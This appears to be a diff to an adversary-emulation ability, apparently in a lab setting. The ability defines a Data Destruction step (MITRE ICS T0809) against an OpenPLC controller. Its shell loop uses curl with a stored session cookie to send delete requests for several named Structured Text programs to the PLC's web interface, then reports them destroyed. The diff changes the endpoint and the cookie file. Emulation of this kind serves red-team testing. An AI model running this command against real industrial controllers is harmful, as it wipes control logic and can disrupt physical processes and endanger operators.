@@ -3,9 +3,7 @@
 - id: c9d0e1f2-9999-9999-9999-000000000004
   name: OpenPLC - Data Destruction of PLC Programs
   description: |
-    Delete all Structured Text programs from the PLC's persistent
-    storage. This prevents recovery of the legitimate control logic
-    and forces operators to restore from backup.
+    Delete programs via the correct /remove-program endpoint.
   tactic: inhibit-response-function
   technique_id: T0809
   technique_name: Data Destruction
@@ -14,9 +12,11 @@
     name: sh
     command: >
       for prog in 326339.st 690525.st 655326.st blank_program.st; do
-        curl -s -b /tmp/plc.jar
-        -X POST "http://192.168.95.2:8080/delete-program"
-        -d "program_name=$prog" -L -o /dev/null;
+        curl -s -b /tmp/plc_cookies.txt
+        -d "program_name=$prog"
+        "http://192.168.95.2:8080/remove-program"
+        -o /dev/null;
         echo "DELETED: $prog";
       done &&
       echo "ALL_PROGRAMS_DESTROYED"
+    timeout: 60
